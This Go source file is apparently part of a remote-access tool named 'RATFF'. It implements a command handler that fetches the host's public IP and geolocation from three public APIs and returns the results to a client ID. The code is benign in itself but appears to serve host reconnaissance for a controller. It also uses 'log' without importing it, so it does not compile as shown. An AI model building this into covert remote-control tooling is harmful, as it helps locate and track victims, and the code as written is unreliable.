package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"sync"
	"time"

	"RATFF/shared"
)

// ipAPIs lists available IP geolocation APIs.
var ipAPIs = []string{
	"http://ip-api.com/json/",
	"http://ipinfo.io/json",
	"https://httpbin.org/ip",
}

// handlePublicIP fetches public IP info from multiple APIs concurrently.
func handlePublicIP(msg shared.Message) shared.Message {
	result := make(map[string]interface{})

	var mu sync.Mutex
	var wg sync.WaitGroup

	for _, apiURL := range ipAPIs {
		wg.Add(1)
		go func(url string) {
			defer wg.Done()

			data, err := fetchRawJSON(url)
			mu.Lock()
			defer mu.Unlock()

			if err != nil {
				result[url] = map[string]interface{}{"error": err.Error()}
				return
			}
			result[url] = data
		}(apiURL)
	}

	wg.Wait()

	return shared.NewMessage(shared.MsgResponse, shared.CmdPublicIP, msg.ClientID, result)
}

// fetchRawJSON fetches and parses JSON from an API endpoint.
func fetchRawJSON(url string) (map[string]interface{}, error) {
	client := &http.Client{Timeout: 10 * time.Second}

	resp, err := client.Get(url)
	if err != nil {
		return nil, fmt.Errorf("request failed: %v", err)
	}
	defer func() {
		if closeErr := resp.Body.Close(); closeErr != nil {
			log.WithError(closeErr).Warn("Failed to close response body")
		}
	}()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("API returned status %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read response failed: %v", err)
	}

	var data map[string]interface{}
	if err := json.Unmarshal(body, &data); err != nil {
		return nil, fmt.Errorf("parse JSON failed: %v", err)
	}

	return data, nil
}
